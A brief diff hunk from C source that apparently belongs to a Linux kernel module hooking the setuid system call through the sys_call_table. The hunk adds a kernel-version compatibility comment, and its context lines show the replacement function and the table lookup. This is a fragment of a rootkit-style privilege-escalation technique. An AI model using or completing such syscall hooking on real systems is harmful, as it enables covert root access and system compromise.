@@ -101,6 +101,7 @@ static asmlinkage int setuidReplacement(uid_t uid)
 	return 0;
 }
 
+//This module is compatible with kernel version 4.4.0-66-generic
 static int __init init_hook(void)
 {
 	SysCallTable = (void*)FindMemoryLocationOfSETUID();  //Can be found using: grep "sys_call_table" /boot/System.map-`uname -r`
